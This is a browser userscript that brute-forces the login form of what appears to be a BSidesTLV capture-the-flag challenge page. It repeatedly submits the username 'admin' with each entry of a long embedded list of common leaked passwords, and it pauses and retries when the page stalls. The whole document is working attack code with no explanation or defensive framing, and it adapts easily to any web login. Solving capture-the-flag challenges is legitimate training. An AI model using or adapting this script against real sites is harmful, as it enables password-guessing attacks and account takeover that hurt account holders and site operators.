// ==UserScript==
// @name         recaptcha bruteforce
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://recaptcha2.challenges.bsidestlv.com/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const usernames = [
        'admin'
    ];
    const passes = getPasses();
    let usernameNum = 0;
    let tryNum = 0;
    let delay = 0, delayLeft = 0;

    setInterval(() => {
        if (delayLeft) {
            delayLeft--;
            return;
        }

        const result = document.getElementById('result').innerHTML;
        if (tryNum > 0 && result === 'trying...') {
            tryNum--; // retry
            document.getElementById('result').innerHTML = 'Username/Password invalid!';
            delay += 2;
        } else {
            let anotherTry = tryNum < passes.length && (tryNum === 0 || result === 'Username/Password invalid!' || result === 'trying...');
            if (anotherTry) {
                console.log('Trying', passes[tryNum]);
                document.getElementById('result').innerHTML = 'trying...';
                tryUserPass(usernames[usernameNum], passes[tryNum]);
                tryNum++;
            } else if (usernameNum + 1 < usernames.length) {
                usernameNum++;
                tryNum = 0;
                delay = 0;
                delayLeft = 0;
            } else {
                console.log('Done');
            }

            if (delay > 0) {
                delay--;
            }
        }

        delayLeft = delay;
    }, 2000);

    function tryUserPass(user, pass) {
        document.getElementById('username').value = user;
        document.getElementById('password').value = pass;
        document.getElementById('formContent').querySelector('input[type=submit]').click();
    }

    function getPasses() {
        return [
            '123456','12345','123456789','password','iloveyou','princess','1234567','rockyou','12345678','abc123','nicole','daniel','babygirl','monkey','lovely','jessica','654321','michael','ashley','qwerty','111111','iloveu','000000','michelle','tigger','sunshine','chocolate','password1','soccer','anthony','friends',
                'butterfly','purple','angel','jordan','liverpool','justin','loveme','fuckyou','123123','football','secret','andrea','carlos','jennifer','joshua','bubbles','1234567890','superman','hannah','amanda','loveyou','pretty','basketball','andrew','angels','tweety','flower','playboy','hello','elizabeth','hottie','tinkerbell','charlie','samantha','barbie','chelsea','lovers','teamo','jasmine','brandon','666666','shadow','melissa','eminem','matthew','robert','danielle','forever','family','jonathan','987654321','computer','whatever','dragon','vanessa','cookie','naruto','summer','sweety','spongebob','joseph','junior','softball','taylor','yellow','daniela','lauren','mickey','princesa','alexandra','alexis','jesus','estrella','miguel','william','thomas','beautiful','mylove','angela','poohbear','patrick','iloveme','sakura','adrian','alexander','destiny','christian','121212','sayang','america','dancer','monica','richard','112233','princess1','555555','diamond','carolina','steven','rangers','louise','orange','789456','999999','shorty','11111','nathan','snoopy','gabriel','hunter','cherry','killer','sandra','alejandro','buster','george','brittany','alejandra','patricia','rachel','tequiero','7777777','cheese','159753','arsenal','dolphin','antonio','heather','david','ginger','stephanie','peanut','blink182','sweetie','222222','beauty','987654','victoria','honey','00000','fernando','pokemon','maggie','corazon','chicken','pepper','cristina','rainbow','kisses','manuel','myspace','rebelde','angel1','ricardo','babygurl','heaven','55555','baseball','martin','greenday','november','alyssa','madison','mother','123321','123abc','mahalkita','batman','september','december','morgan','mariposa','maria','gabriela','iloveyou2','bailey','jeremy','pamela','kimberly','gemini','shannon','pictures','asshole','sophie','jessie','hellokitty','claudia','babygirl1','angelica','austin','mahalko','victor','horses','tiffany','mariana','eduardo','andres','courtney','booboo','kissme','harley','ronaldo','iloveyou1','precious','october','inuyasha','peaches','veronica','chris','888888','adriana','cutie','james','banana','prince','friend','jesus1','crystal','celtic','zxcvbnm','edward','oliver','diana','samsung','freedom','angelo','kenneth','master','scooby','carmen','456789','sebastian','rebecca','jackie','spiderman','christopher','karina','johnny','hotmail','0123456789','school','barcelona','august','orlando','samuel','cameron','slipknot','cutiepie','monkey1','50cent','bonita','kevin','bitch','maganda','babyboy','casper','brenda','adidas','kitten','karen','mustang','isabel','natalie','cuteako','javier','789456123','123654','sarah','bowwow','portugal','laura','777777','marvin','denise','tigers','volleyball','jasper','rockstar','january','fuckoff','alicia','nicholas','flowers','cristian','tintin','bianca','chrisbrown','chester','101010','smokey','silver','internet','sweet','strawberry','garfield','dennis','panget','francis','cassie','benfica','love123','696969','asdfgh','lollipop','olivia','cancer','camila','qwertyuiop','superstar','harrypotter','ihateyou','charles','monique','midnight','vincent','christine','apples','scorpio','jordan23','lorena','andreea','mercedes','katherine','charmed','abigail','rafael','icecream','mexico','brianna','nirvana','aaliyah','pookie','johncena','lovelove','fucker','abcdef','benjamin','131313','gangsta','brooke','333333','hiphop','aaaaaa','mybaby','sergio','welcome','metallica','julian','travis','myspace1','babyblue','sabrina','michael1','jeffrey','stephen','love','dakota','catherine','badboy','fernanda','westlife','blondie','sasuke','smiley','jackson','simple','melanie','steaua','dolphins','roberto','fluffy','teresa','piglet','ronald','slideshow','asdfghjkl','minnie','newyork','jason','raymond','santiago','jayson','88888888','5201314','jerome','gandako','muffin','gatita','babyko','246810','sweetheart','chivas','ladybug','kitty','popcorn','alberto','valeria','cookies','leslie','jenny','nicole1','12345678910','leonardo','jayjay','liliana','dexter','sexygirl','232323','amores','rockon','christ','babydoll','anthony1','marcus','bitch1','fatima','miamor','lover','chris1','single','eeyore','lalala','252525','scooter','natasha','skittles','brooklyn','colombia','159357','teddybear','winnie','happy','manutd','123456a','britney','katrina','christina','pasaway','cocacola','mahal','grace','linda','albert','tatiana','london','cantik','0123456','lakers','marie','teiubesc','147258369','charlotte','natalia','francisco','amorcito','smile','paola','angelito','manchester','hahaha','elephant','mommy1','shelby','147258','kelsey','genesis','amigos','snickers','xavier','turtle','marlon','linkinpark','claire','stupid','147852','marina','garcia','fuckyou1','diego','brandy','letmein','hockey','444444','sharon','bonnie','spider','iverson','andrei','justine','frankie','pimpin','disney','rabbit','54321','fashion','soccer1','red123','bestfriend','england','hermosa','456123','qazwsx','bandit','danny','allison','emily','102030','lucky1','sporting','miranda','dallas','hearts','camille','wilson','potter','pumpkin','iloveu2','number1','katie','guitar','212121','truelove','jayden','savannah','hottie1','phoenix','monster','player','ganda','people','scotland','nelson','jasmin','timothy','onelove','ilovehim','shakira','estrellita','bubble','smiles','brandon1','sparky','barney','sweets','parola','evelyn','familia','love12','nikki','motorola','florida','omarion','monkeys','loverboy','elijah','joanna','canada','ronnie','mamita','emmanuel','thunder','999999999','broken','rodrigo','maryjane','westside','california','lucky','mauricio','yankees','jackass','jamaica','justin1','amigas','preciosa','shopping'
        ];
    }
})();